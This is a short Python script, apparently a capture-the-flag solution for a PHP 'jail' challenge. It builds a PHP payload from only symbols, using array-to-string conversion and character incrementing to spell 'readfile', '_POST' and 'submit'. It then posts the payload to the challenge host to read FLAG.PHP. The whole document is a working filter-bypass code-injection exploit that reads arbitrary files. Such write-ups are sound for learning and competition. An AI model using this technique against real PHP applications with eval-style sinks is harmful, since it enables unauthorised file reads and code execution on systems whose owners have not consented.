import requests
import re
import string

def char_payload(char: str, concat_target):
	if char == "_":
		return concat_target + '.="_";'
	elif char in string.ascii_lowercase:
		return (f"$__=$______;" + "$__++;" * (ord(char) - ord("a")) + concat_target + ".=$__;")
	else:
		return ("$__=$_;" + "$__++;" * (ord(char) - ord("A")) + concat_target + ".=$__;")

newline = "\n"  #f string restriction
payload = f"""
$_=[];
$_="$_";
$_=$_[$__];

$______=[];
$______="$______";
$_______++;$_______++;$_______++;
$______=$______[$_______];

$___="";
{newline.join(char_payload(c,'$___') for c in "readfile")}

$____="_";
{newline.join(char_payload(c,'$____') for c in "POST" )}

$_____="";
{newline.join(char_payload(c,'$_____') for c in "submit")}

$_=$$____;
$___($_[$_____]);"""

print(payload)
payload = payload.replace("\n", "").replace(" ", "")
print([c for c in payload if c not in '$()_[]=;+".'])
print(
	requests.post("http://jailoowarmup.fword.wtf/", data={
	"cmd": payload,
	"submit": 'FLAG.PHP'
	}).text
)
